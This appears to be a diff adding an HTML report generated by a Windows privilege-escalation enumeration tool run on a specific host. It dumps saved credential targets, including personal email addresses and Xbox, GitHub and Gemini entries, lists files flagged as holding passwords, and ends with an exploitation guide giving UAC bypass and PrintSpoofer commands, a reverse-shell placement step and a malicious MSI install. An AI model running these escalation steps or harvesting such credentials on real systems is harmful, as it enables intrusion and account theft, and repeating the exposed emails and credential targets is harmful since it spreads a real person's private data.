@@ -1,0 +1,189 @@
+<!DOCTYPE html><html><head><title>Windows Privesc Report</title>
+<style>
+body { font-family: monospace; background:#111; color:#eee; padding:20px; }
+h1 { color:#ff5555; } h3 { color:#55ff55; border-bottom:1px solid #333; }
+pre { background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }
+</style></head><body>
+<h1>Windows Privilege Escalation Report</h1>
+<p><b>Hostname:</b> FADED-PC</p>
+<p><b>User:</b> PMYLS</p>
+<p><b>Admin:</b> False</p>
+<p><b>Timestamp:</b> 2026-10-23T19:37:21.175812</p>
+<p><b>Findings:</b> 2</p>
+<ul><li>misconfig.saved_credentials (35)</li><li>creds.files (30)</li></ul>
+<h3>system_enum</h3><pre>{
+  "os_name": "Microsoft Windows 11 Enterprise",
+  "os_version": "LENOVO JKCN90WW(Logo), 6/21/2023",
+  "hotfix_count": 0,
+  "local_users": [
+    "Administrator",
+    "CodexSandboxOffline",
+    "CodexSandboxOnline",
+    "DefaultAccount",
+    "Guest",
+    "PMYLS",
+    "WDAGUtilityAccount",
+    "WsiAccount"
+  ],
+  "administrators": [
+    "Administrator",
+    "PMYLS"
+  ],
+  "service_count": 327
+}</pre><h3>misconfig</h3><pre>{
+  "unquoted_paths": [],
+  "always_install_elevated": false,
+  "autologon": {},
+  "saved_credentials": [
+    "Target: MicrosoftAccount:target=SSO_POP_Device",
+    "Target: MicrosoftAccount:target=SSO_POP_User:user=saadanjum908@gmail.com",
+    "Target: MicrosoftAccount:target=SSO_POP_User:user=saadrkhan074@gmail.com",
+    "Target: LegacyGeneric:target=XboxLive",
+    "Target: LegacyGeneric:target=gemini:antigravity",
+    "Target: LegacyGeneric:target=XblGrts|506671725|000300002117337D|Production|RETAIL|Xtoken|http://mp.microsoft.com/||JWT",
+    "Target: LegacyGeneric:target=XblGrts|704208617||Production|RETAIL|Dtoken|http://auth.xboxlive.com||JWT",
+    "Target: LegacyGeneric:target=MicrosoftAccount:user=saadrkhan074@gmail.com",
+    "Target: LegacyGeneric:target=XblGrts|704208617|000300002117337D|Production|RETAIL|Xtoken|http://xboxlive.com||JWT",
+    "Target: LegacyGeneric:target=git:https://github.com",
+    "Target: LegacyGeneric:target=XblGrts|506671725|000300002117337D|Production|RETAIL|Utoken|http://auth.xboxlive.com||JWT",
+    "Target: LegacyGeneric:target=XblGrts|704208617||Production|RETAIL|Ttoken|http://auth.xboxlive.com||JWT",
+    "Target: LegacyGeneric:target=XblGrts|506671725|000300002117337D|Production|RETAIL|Xtoken|http://xboxlive.com||JWT",
+    "Target: LegacyGeneric:target=XblGrts|506671725||Production|RETAIL|Ttoken|http://auth.xboxlive.com||JWT",
+    "Target: LegacyGeneric:target=XblGrts|704208617|000300002117337D|Production|RETAIL|Xtoken|http://gssv.xboxlive.com/||JWT",
+    "Target: LegacyGeneric:target=XblGrts|704208617|000300002117337D|Production|RETAIL|Xtoken|http://xboxlive.com||JWT|1",
+    "Target: LegacyGeneric:target=XblGrts|506671725|000300002117337D|Production|RETAIL|Xtoken|http://xboxlive.com||JWT|1",
+    "Target: LegacyGeneric:target=XblGrts|704208617||Production|RETAIL|Dtoken|http://auth.xboxlive.com||JWT|1",
+    "Target: LegacyGeneric:target=XblGrts|704208617|000300002117337D|Production|RETAIL|Utoken|http://auth.xboxlive.com||JWT",
+    "Target: LegacyGeneric:target=JianyingPro Cached Credential",
+    "Target: LegacyGeneric:target=WindowsLive:(token):name=saadanjum908@gmail.com;serviceuri=http://passport.net/purpose",
+    "Target: LegacyGeneric:target=XblGrts|506671725|000300002117337D|Production|RETAIL|Xtoken|http://mp.microsoft.com/||JWT|1",
+    "Target: LegacyGeneric:target=MicrosoftOffice15_Data:live:cid=ac1e82e80c60fa32",
+    "Target: LegacyGeneric:target=XblGrts|704208617|000300002117337D|Production|RETAIL|Xtoken|http://mp.microsoft.com/||JWT|1",
+    "Target: WindowsLive:target=virtualapp/didlogical",
+    "Target: LegacyGeneric:target=OneDrive Cached Credential",
+    "Target: LegacyGeneric:target=Olk/PushNotificationsKey",
+    "Target: LegacyGeneric:target=MicrosoftAccount:user=saadanjum908@gmail.com",
+    "Target: LegacyGeneric:target=XblGrts|704208617|000300002117337D|Production|RETAIL|Xtoken|http://mp.microsoft.com/||JWT",
+    "Target: LegacyGeneric:target=XblGrts|506671725||Production|RETAIL|Dtoken|http://aut</pre><h3>creds</h3><pre>{
+  "files_with_passwords": [
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\Adobe\\Premiere Pro\\13.0\\Profile-PMYLS\\Layouts\\WorkspaceConfig.xml",
+      "size": 3500
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\Adobe\\Premiere Pro\\13.0\\Profile-PMYLS\\Settings\\EssentialSound\\Default\\ambience\\(Config).essentialsound",
+      "size": 1824
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\Adobe\\Premiere Pro\\13.0\\Profile-PMYLS\\Settings\\EssentialSound\\Default\\dialog\\(Config).essentialsound",
+      "size": 9569
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\Adobe\\Premiere Pro\\13.0\\Profile-PMYLS\\Settings\\EssentialSound\\Default\\generic\\(Config).essentialsound",
+      "size": 503
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\Adobe\\Premiere Pro\\13.0\\Profile-PMYLS\\Settings\\EssentialSound\\Default\\music\\(Config).essentialsound",
+      "size": 540
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\Adobe\\Premiere Pro\\13.0\\Profile-PMYLS\\Settings\\EssentialSound\\Default\\sfx\\(Config).essentialsound",
+      "size": 1764
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\Calculator\\Calculator\\Calculator\\Calculator\\app.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\Calculator\\Calculator\\Calculator\\Calculator\\bin\\Debug\\Calculator.exe.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\DB_connectivity\\DB_connectivity\\DB_connectivity\\DB_connectivity\\app.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\DB_connectivity\\DB_connectivity\\DB_connectivity\\DB_connectivity\\bin\\Debug\\DB_connectivity.exe.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\error_provider\\error_provider\\app.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\error_provider\\error_provider\\bin\\Debug\\error_provider.exe.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\LIstBox\\LIstBox\\app.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\LIstBox\\LIstBox\\bin\\Debug\\LIstBox.exe.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\Nazia\\calculator_Nazia\\calculator_Nazia\\Calculator\\app.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\Nazia\\calculator_Nazia\\calculator_Nazia\\Calculator\\bin\\Debug\\Calculator.exe.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\PMLS\\Documents\\SharpDevelop Projects\\Nazia\\DataBaseConnection_Nazia\\DataBaseConnection\\DataBaseConnection\\DB_connectivity\\app.config",
+      "size": 173
+    },
+    {
+      "path": "C:\\Users\\</pre><h3>exploitation_guide</h3><pre>{
+  "uac_bypass": {
+    "description": "Bypass UAC to elevate from standard user to admin",
+    "tools": [
+      "UACME (akagi64.exe)",
+      "fodhelper.exe",
+      "eventvwr.exe"
+    ],
+    "prerequisite": "Standard user with admin group membership",
+    "manual_steps": [
+      "Download UACME from github.com/hfiref0x/UACME",
+      "Run: akagi64.exe 23 C:\\Windows\\System32\\cmd.exe"
+    ]
+  },
+  "token_impersonation": {
+    "description": "Impersonate SYSTEM via SeImpersonatePrivilege",
+    "tools": [
+      "PrintSpoofer.exe",
+      "JuicyPotato.exe",
+      "RoguePotato.exe"
+    ],
+    "prerequisite": "Service account with SeImpersonate enabled",
+    "manual_steps": [
+      "Download PrintSpoofer64.exe",
+      "Run: PrintSpoofer64.exe -i -c cmd"
+    ]
+  },
+  "unquoted_service_path": {
+    "description": "Place malicious executable in unquoted service path",
+    "tools": [
+      "Manual (create exe in C:\\Program.exe)"
+    ],
+    "prerequisite": "Service with unquoted path running as SYSTEM",
+    "manual_steps": [
+      "Identify unquoted path from Phase 2",
+      "Place reverse-shell exe at the parse-break point",
+      "Restart the service"
+    ]
+  },
+  "always_install_elevated": {
+    "description": "Install MSI as SYSTEM",
+    "tools": [
+      "msiexec.exe"
+    ],
+    "prerequisite": "AlwaysInstallElevated enabled in both HKLM and HKCU",
+    "manual_steps": [
+      "Generate MSI with msfvenom",
+      "Run: msiexec /quiet /qn /i malicious.msi"
+    ]
+  }
+}</pre>
+</body></html>
